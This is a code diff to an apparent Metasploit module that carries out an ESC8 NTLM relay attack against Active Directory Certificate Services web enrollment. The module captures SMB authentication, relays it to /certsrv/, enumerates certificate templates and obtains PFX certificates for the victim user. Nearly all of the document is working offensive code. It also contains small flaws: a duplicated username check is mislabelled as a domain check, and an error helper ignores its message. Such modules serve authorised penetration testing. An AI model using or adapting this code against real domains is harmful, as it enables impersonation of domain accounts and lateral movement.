@@ -35,16 +35,44 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
         OptBool.new('QUERY_TEMPLATES', [ true, 'Query certificate templates and print them before attempting to use them', true ]),
         OptBool.new('QUERY_ONLY', [ true, 'Only use the relay to get a list of templates; do not generate certificates.', false ]),
+        OptAddress.new('RELAY_TARGET', [true, 'Target address range or CIDR identifier to relay to'], aliases: ['SMBHOST']),
         OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
         OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
         OptInt.new('TIMEOUT', [ true, 'Seconds to wait for a response.', 20])
       ]
     )
+    register_advanced_options(
+      [
+        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
 
-    deregister_options('SMBServerIdleTimeout')
+      ]
+    )
+    deregister_options('SMBServerIdleTimeout', 'RHOSTS', 'SMBPass', 'SMBUser', 'CommandShellCleanupCommand', 'AutoVerifySession')
+  end
+
+  def initial_handshake?
+    vprint_status('Verifying HTTP Relay target Has Web Enrollment enabled')
+    res = send_request_cgi(
+      {
+        'rhost' => datastore['RELAY_TARGET'],
+        'method' => 'GET',
+        'uri' => normalize_uri(datastore['CERT_URI']),
+        'headers' => {
+          'Accept-Encoding' => 'identity'
+        }
+      }
+    )
+
+    return false if res.code != 401
+
+    return true
   end
 
   def start_service(opts = {})
+    unless initial_handshake?
+      fail_with(Failure::UnexpectedReply, "#{datastore['RELAY_TARGET']} does not appear to have Web enrollment enabled on #{datastore['CERT_URI']}")
+    end
+
     ntlm_provider = HTTPRelayNTLMProvider.new(
       listener: self
     )
@@ -62,7 +90,7 @@ class MetasploitModule < Msf::Auxiliary
   def on_client_connect(_client)
     @login_uri = normalize_uri("#{datastore['CERT_URI']}/csertfnsh.asp")
     @http_timeout = datastore['TIMEOUT']
-    print_good('Received SMB connection on Auth Capture Server!')
+    print_good('Received SMB connection on ESC8 Relay Server!')
   end
 
   alias run exploit
@@ -80,18 +108,35 @@ class MetasploitModule < Msf::Auxiliary
     return request
   end
 
+  def exit_with_error(_error_string)
+    print_error
+  end
+
   def post_login_action(kwargs = {})
     authenticated_username = kwargs[:authenticated_username]
-    client_socket = kwargs[:client_socket]
-    if client_socket.nil? || authenticated_username.nil?
-      fail_with(Failure::BadConfig, 'Post Login Action requires an authenticated socket and username')
+    authenticated_http_client = kwargs[:authenticated_http_client]
+    authenticated_domain = kwargs[:authenticated_domain]
+
+    if authenticated_username.nil?
+      print_error('esc8_relay: Post Login Action requires an authenticated username')
+      return nil
     end
+    if authenticated_http_client.nil?
+      print_error('esc8_relay: Failed to authenticate')
+      return nil
+    end
+    if authenticated_username.nil?
+      print_error('esc8_relay: Post Login Action requires an authenticated domain')
+      return nil
+    end
+
     cert_list = nil
     if datastore['QUERY_TEMPLATES']
       print_status('Querying certificate templates; this may take some time')
-      cert_list = get_cert_list(client_socket)
-      if cert_list.nil?
-        print_bad('Could not query Cert List')
+      cert_list = get_cert_list(authenticated_http_client)
+      if cert_list.nil? || cert_list.empty?
+        print_bad('http_relay failed to query cert_list') if cert_list.nil?
+        print_bad('http_relay returned no available certs') if cert_list.empty?
       else
         print_status('Available Certificates:')
         cert_list.each do |cert_entry|
@@ -100,16 +145,16 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
     unless datastore['QUERY_ONLY']
-      if cert_list.nil? || cert_list.include?(datastore['CERT_TEMPLATE'])
+      if cert_list.nil? || cert_list.empty? || cert_list.include?(datastore['CERT_TEMPLATE'])
         # if we don't have a cert list or if the cert is in the list, just generate that cert
-        retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], authenticated_username)
+        retrieve_cert(datastore['CERT_TEMPLATE'], authenticated_username, authenticated_domain, authenticated_http_client)
       else
         # if we have a cert list and the desired template is not there
         # or the desired template is nil, just issue all available certs
         print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
         print_status('Attempting to generate certificates for all templates')
         cert_list.each do |cert_entry|
-          retrieve_cert(client_socket, cert_entry, authenticated_username)
+          retrieve_cert(cert_entry, authenticated_username, authenticated_domain, authenticated_http_client)
         end
       end
     end
@@ -131,12 +176,12 @@ class MetasploitModule < Msf::Auxiliary
     return user_list
   end
 
-  def retrieve_cert(client_socket, cert_template, authenticated_user)
+  def retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
     vprint_status("Sending Post to generate certificate for #{authenticated_user} using the #{cert_template} template")
     private_key = OpenSSL::PKey::RSA.new(4096)
     request = create_csr(private_key, cert_template)
     cert_template_string = "CertificateTemplate:#{cert_template}"
-    req = client_socket.request_cgi(
+    req = authenticated_http_client.request_cgi(
       {
         'method' => 'POST',
         'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
@@ -151,7 +196,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       }
     )
-    res = client_socket._send_recv(req, @http_timeout, true)
+    res = authenticated_http_client._send_recv(req, @http_timeout, true)
     vprint_status('Post Sent')
     if res&.code == 200 && !res.body.include?('request was denied')
       print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
@@ -164,14 +209,14 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Certificate location tag = #{location_tag}")
     location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
     vprint_status('Requesting Certificate from Relay Target...')
-    req = client_socket.request_cgi(
+    req = authenticated_http_client.request_cgi(
       {
         'method' => 'GET',
         'uri' => location_uri
       }
     )
-    res = client_socket._send_recv(req, @http_timeout, true)
-    info = nil
+    res = authenticated_http_client._send_recv(req, @http_timeout, true)
+    info = "#{authenticated_domain}\\#{authenticated_user} Certificate"
     certificate = OpenSSL::X509::Certificate.new(res.body)
     pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
     stored_path = store_loot('windows.ad.cs',
@@ -180,7 +225,7 @@ class MetasploitModule < Msf::Auxiliary
                              pkcs12.to_der,
                              'certificate.pfx',
                              info)
-    print_status("Certificate for #{authenticated_user} using template #{cert_template} saved to #{stored_path}")
+    print_status("Certificate for #{authenticated_domain}\\#{authenticated_user} using template #{cert_template} saved to #{stored_path}")
     return certificate
   end
 
